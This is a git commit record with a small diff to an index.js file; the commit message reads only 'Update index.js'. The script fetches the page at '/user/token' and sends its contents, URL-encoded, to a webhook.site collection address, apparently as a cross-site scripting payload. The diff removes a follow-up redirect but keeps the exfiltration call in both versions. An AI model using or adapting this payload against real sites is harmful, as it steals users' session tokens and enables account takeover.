473cb036b5e4f6bf3d736fce570f09ffed234526
JDKR <57557558+jk-dr@users.noreply.github.com>
2026-02-09 19:56:08 +1100

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 fetch("/user/token")
   .then(r => r.text())
   .then(html => {
-    fetch("https://webhook.site/c6737c07-be88-4d90-a707-7f11222282c4?c=" +encodeURIComponent(html)).then(window.location.href="/");
+    fetch("https://webhook.site/c6737c07-be88-4d90-a707-7f11222282c4?c=" +encodeURIComponent(html))
   });
